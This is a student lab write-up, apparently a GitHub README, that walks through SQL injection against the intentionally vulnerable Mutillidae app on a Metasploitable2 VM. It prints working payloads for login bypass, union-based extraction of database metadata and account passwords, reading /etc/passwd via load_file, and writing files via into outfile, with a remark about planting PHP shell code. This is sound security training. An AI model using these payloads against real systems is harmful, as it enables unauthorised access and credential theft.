# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

## Developed By:Lokesh N
## Reg No:212222100023
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/40c274fa-8314-4817-9f44-8df854d1651d)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/6e4460ab-2dc1-48b2-8419-d8e155ad71aa)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/b6595c9c-cbd8-45ff-8ead-7c297b139f81)

Click on the menu Login/Register and register for an account
![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/0f999cf5-72b2-4401-9965-a7497338ac27)


Click on the link “Please register here”

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/0f47da6a-c721-4787-a071-c8b76565dd32)

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/430fa16c-491b-48dc-8136-b4813537a58e)


Click on “Create Account” to display the following page:

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/fdf45138-6b87-463f-98fb-8b55b0ea454e)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/e9a53b75-9cc8-432f-a098-f91ca444b364)


Click “Login”. The logged in page will show as below:

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/6094be4f-cb26-4ec1-b59d-be493840b27e)


## Bypassing login field:
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/f89f41ee-512b-4dd8-a15b-988535f64564)


Click the login button and you will see it enter into the administrator page.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/19355bcf-c589-4c33-9b37-c972e7d7170e)

## Union-based SQL injection:
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/1ef40c4a-c6ce-46c7-96bc-166e35abf154)

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/398d0910-e706-4d79-87ab-ae5472ed8973)


![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/1fb50f2b-7574-4bf8-8304-6beee03b9aeb)

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/42b324ba-93ee-4c7f-8fdb-043eb4e55d27)

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/27a74f6d-7d05-4aee-98a6-0e1bd7d67c18)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/6f622769-a585-4415-a1a2-6089e1942da7)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/92f67d69-04e3-42b0-bbe8-e17842d26a61)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/20e9af9f-647a-4682-a13a-09978f73d73b)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/019bbe45-2f32-48eb-b567-b1026c02d85c)


As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/40e3d384-2bd6-4269-92be-c9eb7a324a96)

As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/af5e9029-c273-4d21-abe9-2ba82a1bd402)



As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/c41d277b-b867-43dd-9c2c-cde8c76d5aeb)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/b85dd101-2efe-482d-b920-544cbbba99d5)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/3f8fa852-6363-4948-8b66-0529384412f6)

The url once executed will retrieve table names from the “owasp 10” database.
## Extracting sensitive data such as passwords:
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/962a4df0-754b-45e0-b95c-6d28a288e602)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/3ddc6b79-2cc3-42d8-900c-02bad6901472)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/47c7189b-6a91-4eb3-8eb5-4313877edfb8)


## Reading and writing files on the webserver:
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/lokeshnarayanan/sqlinjection/assets/119393019/5b732b24-d1ef-4388-a289-dcd409e35203)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
